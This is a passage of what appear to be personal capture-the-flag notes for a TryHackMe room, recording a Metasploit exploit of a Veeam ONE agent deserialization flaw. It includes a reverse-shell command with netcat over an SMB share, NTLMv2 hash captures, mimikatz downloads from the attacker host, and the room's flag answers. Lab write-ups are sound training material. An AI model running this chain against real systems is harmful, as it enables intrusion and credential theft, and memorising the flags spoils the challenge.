+   SRVPORT        8080                          yes       The local port to listen on.
+   SSL            false                         no        Negotiate SSL for incoming connections
+   SSLCert                                      no        Path to a custom SSL certificate (default is rando
+                                                          mly generated)
+   URIPATH                                      no        The URI to use for this exploit (default is random
+                                                          )
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   2   PowerShell Stager
+
+View the full module info with the info, or info -d command.
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set target 3
+target => 3
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > show options
+
+Module options (exploit/windows/misc/veeam_one_agent_deserialization):
+
+   Name           Current Setting               Required  Description
+   ----           ---------------               --------  -----------
+   CMD            nc.exe 10.8.19.103 4444 -e   yes       Command to be executed on the target
+                  cmd
+   HOSTINFO_NAME  AgentController               yes       Name to send in host info (must be recognized by s
+                                                          erver!)
+   RHOSTS                                       yes       The target host(s), see https://github.com/rapid7/
+                                                          metasploit-framework/wiki/Using-Metasploit
+   RPORT          2805                          yes       The target port (TCP)
+   SRVHOST        0.0.0.0                       yes       The local host or network interface to listen on.
+                                                          This must be an address on the local machine or 0.
+                                                          0.0.0 to listen on all addresses.
+   SRVPORT        8080                          yes       The local port to listen on.
+   SSL            false                         no        Negotiate SSL for incoming connections
+   SSLCert                                      no        Path to a custom SSL certificate (default is rando
+                                                          mly generated)
+   URIPATH                                      no        The URI to use for this exploit (default is random
+                                                          )
+
+Payload options (windows/x64/exec):
+
+   Name      Current Setting                 Required  Description
+   ----      ---------------                 --------  -----------
+   CMD       nc.exe 10.8.19.103 4444 -e cmd  yes       The command string to execute
+             
+   EXITFUNC  process                         yes       Exit technique (Accepted: '', seh, thread, process, n
+                                                       one)
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   3   Windows Set Command
+
+View the full module info with the info, or info -d command.
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set rhosts 127.0.0.1
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set SRVHOST 10.8.19.103
+SRVHOST => 10.8.19.103
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set LHOST 10.8.19.103
+LHOST => 10.8.19.103
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set CMD net use a: \\\10.8.19.103\\share /user:me me&a:\nc.exe 10.8.19.103 4444 -e cmd
+CMD => net use a: \10.8.19.103\share /user:me me&a:nc.exe 10.8.19.103 4444 -e cmd
+
+escaping
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set CMD net use a: \\\\10.8.19.103\\share /user:me me&a:\\nc.exe 10.8.19.103 4444 -e cmd
+CMD => net use a: \\10.8.19.103\share /user:me me&a:\nc.exe 10.8.19.103 4444 -e cmd
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ sudo smbserver.py -smb2support -username me -password me share .
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.29.100,50026)
+[*] AUTHENTICATE_MESSAGE (\me,SET)
+[*] User SET\me authenticated successfully
+[*] me:::aaaaaaaaaaaaaaaa:5bbe8b996151d7487041e65c3ac73871:0101000000000000804a8dacf21ed90132e0bb3b4254c90e0000000001001000760056004e006a004f00740071005a0003001000760056004e006a004f00740071005a000200100052005600490053004d007900580064000400100052005600490053004d0079005800640007000800804a8dacf21ed901060004000200000008003000300000000000000000000000003000008e51280f7855608ab05047cf8394e261f4c7b89e9e48340093784f0cd13f40a80a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e00310039002e003100300033000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:share)
+[*] Disconnecting Share(1:IPC$)
+
+uhmm
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ locate nc64.exe
+/home/kali/hackthebox/nc64.exe
+/home/kali/msdt-follina/msdt-follina/nc64.exe
+/home/kali/ra2/nc64.exe
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ cp /home/kali/ra2/nc64.exe nc64.exe
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ chmod +x nc64.exe
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ ls
+CVE-2021-1675.ps1  hash_michelle  hook.zip  nc64.exe  plink.exe        users.xml
+hash_final         hook.lnk       Info.txt  nc.exe    users_final.txt  winPEASany_ofs.exe
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set CMD net use a: \\\\10.8.19.103\\share /user:me me&a:\\nc64.exe 10.8.19.103 4444 -e cmd
+CMD => net use a: \\10.8.19.103\share /user:me me&a:\nc64.exe 10.8.19.103 4444 -e cmd
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > exploit
+
+[*] 127.0.0.1:2805 - Connecting to 127.0.0.1:2805
+[*] 127.0.0.1:2805 - Sending host info to 127.0.0.1:2805
+[*] 127.0.0.1:2805 - Executing Windows Set Command for windows/x64/exec
+[*] 127.0.0.1:2805 - Sending malicious handshake to 127.0.0.1:2805
+[*] Exploit completed, but no session was created.
+```
+```text
+msf6 exploit(windows/misc/veeam_one_agent_deserialization) > options
+
+Module options (exploit/windows/misc/veeam_one_agent_deserialization):
+
+   Name           Current Setting                               Required  Description
+   ----           ---------------                               --------  -----------
+   CMD            net use a: \\10.8.19.103\share /user:me me&a  yes       Command to be executed on the target
+                  :\nc64.exe 10.8.19.103 4444 -e cmd
+   HOSTINFO_NAME  AgentController                               yes       Name to send in host info (must be recognized by server!)
+   RHOSTS         127.0.0.1                                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Usin
+                                                                          g-Metasploit
+   RPORT          2805                                          yes       The target port (TCP)
+   SRVHOST        10.8.19.103                                   yes       The local host or network interface to listen on. This must be an address on the
+                                                                           local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT        8080                                          yes       The local port to listen on.
+   SSL            false                                         no        Negotiate SSL for incoming connections
+   SSLCert                                                      no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                                                      no        The URI to use for this exploit (default is random)
+
+Payload options (windows/x64/exec):
+
+   Name      Current Setting                                                           Required  Description
+   ----      ---------------                                                           --------  -----------
+   CMD       net use a: \\10.8.19.103\share /user:me me&a:\nc64.exe 10.8.19.103 4444   yes       The command string to execute
+             -e cmd
+   EXITFUNC  process                                                                   yes       Exit technique (Accepted: '', seh, thread, process, none)
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   3   Windows Set Command
+
+View the full module info with the info, or info -d command.
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ sudo smbserver.py -smb2support -username me -password me share .
+[sudo] password for kali: 
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.29.100,50140)
+[*] AUTHENTICATE_MESSAGE (\me,SET)
+[*] User SET\me authenticated successfully
+[*] me:::aaaaaaaaaaaaaaaa:81064b34427c6121ffdfa502f9c3c679:01010000000000000040d555f51ed901b8105e597702ba3d00000000010010004a00770047005100510067005a006e00030010004a00770047005100510067005a006e0002001000540057006e0054004f0066006800410004001000540057006e0054004f00660068004100070008000040d555f51ed901060004000200000008003000300000000000000000000000003000008e51280f7855608ab05047cf8394e261f4c7b89e9e48340093784f0cd13f40a80a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e00310039002e003100300033000000000000000000
+[*] Connecting Share(1:share)
+[*] Connecting Share(2:IPC$)
+[*] AUTHENTICATE_MESSAGE (\,SET)
+[*] Could not authenticate user!
+[*] AUTHENTICATE_MESSAGE (\,SET)
+[*] Could not authenticate user!
+[*] AUTHENTICATE_MESSAGE (\,SET)
+[*] Could not authenticate user!
+[*] AUTHENTICATE_MESSAGE (\,SET)
+[*] Could not authenticate user!
+[*] AUTHENTICATE_MESSAGE (\,SET)
+[*] Could not authenticate user!
+[*] AUTHENTICATE_MESSAGE (\,SET)
+[*] Could not authenticate user!
+[*] AUTHENTICATE_MESSAGE (\,SET)
+[*] Could not authenticate user!
+[*] AUTHENTICATE_MESSAGE (\,SET)
+[*] Could not authenticate user!
+[*] AUTHENTICATE_MESSAGE (\,SET)
+[*] Could not authenticate user!
+[*] Disconnecting Share(2:IPC$)
+[*] AUTHENTICATE_MESSAGE (\,SET)
+[*] Could not authenticate user!
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -lnvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.29.100.
+Ncat: Connection from 10.10.29.100:50142.
+Microsoft Windows [Version 10.0.17763.1339]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\windows\system32>whoami
+whoami
+set\one
+
+C:\windows\system32>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Disabled
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+SeTimeZonePrivilege                       Change the time zone                                               Disabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
+
+C:\windows\system32>net user one
+net user one
+User name                    One
+Full Name                    One Agent
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            6/7/2020 6:56:25 AM
+Password expires             Never
+Password changeable          6/7/2020 6:56:25 AM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   1/2/2023 12:55:01 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+
+C:\windows\system32>cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 6EC8-9D7C
+
+ Directory of C:\Users\Administrator\Desktop
+
+06/16/2020  01:07 PM    <DIR>          .
+06/16/2020  01:07 PM    <DIR>          ..
+06/28/2020  07:42 AM               137 Flag3.txt
+               1 File(s)            137 bytes
+               2 Dir(s)  25,284,255,744 bytes free
+
+C:\Users\Administrator\Desktop>type flag3.txt
+type flag3.txt
+Flag3: THM{934f7faaadab3b040edab8214789114c9d3049dd}
+
+I am glad we blocked Veeam ONE agent in Firewall, so we can patch it next week.
+
+:)
+
+was really fun!
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ locate mimikatz.exe
+/home/kali/Downloads/learning_kerberos/mimikatz.exe
+/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
+/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ cp /home/kali/Downloads/learning_kerberos/mimikatz.exe mimikatz.exe
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ ls                 
+CVE-2021-1675.ps1  hash_michelle  hook.zip  mimikatz.exe  nc.exe     users_final.txt  winPEASany_ofs.exe
+hash_final         hook.lnk       Info.txt  nc64.exe      plink.exe  users.xml
+
+C:\Users\One\Documents>certutil.exe -urlcache -f http://10.8.19.103:1337/mimikatz.exe mimikatz.exe
+certutil.exe -urlcache -f http://10.8.19.103:1337/mimikatz.exe mimikatz.exe
+Access is denied.
+
+C:\Users\One\Documents>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\One\Documents> Invoke-WebRequest -Uri http://10.8.19.103:1337/mimikatz.exe -outfile mimikatz.exe
+Invoke-WebRequest -Uri http://10.8.19.103:1337/mimikatz.exe -outfile mimikatz.exe
+PS C:\Users\One\Documents> ls
+ls
+
+    Directory: C:\Users\One\Documents
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----         1/2/2023   2:09 PM        1263880 mimikatz.exe  
+
+:)
+
+PS C:\Users\Administrator\Downloads> cmd
+cmd
+Microsoft Windows [Version 10.0.17763.1339]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\Downloads>.\mimikatz.exe
+.\mimikatz.exe
+The system cannot execute the specified program.
+
+C:\Users\Administrator\Downloads>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 6EC8-9D7C
+
+ Directory of C:\Users\Administrator\Downloads
+
+01/02/2023  02:13 PM    <DIR>          .
+01/02/2023  02:13 PM    <DIR>          ..
+               0 File(s)              0 bytes
+               2 Dir(s)  25,279,234,048 bytes free
+```
+![[Pasted image 20230102101942.png]]
+![[Pasted image 20230102122020.png]]
+![[Pasted image 20230102150738.png]]
+Flag 1
+Flag 2
+Flag 3
+
+## Flags / Answers
+- ***THM{4c66e2b8d4c45a65e6a7d0c7ad4a5d7ff245dc14}***
+- ***THM{690798b1780964f5f51cebd854da5a2ea236ebb5}***
+- ***THM{934f7faaadab3b040edab8214789114c9d3049dd}***
+
+## Notes / Lessons Learned
+[[Atlas]]
+
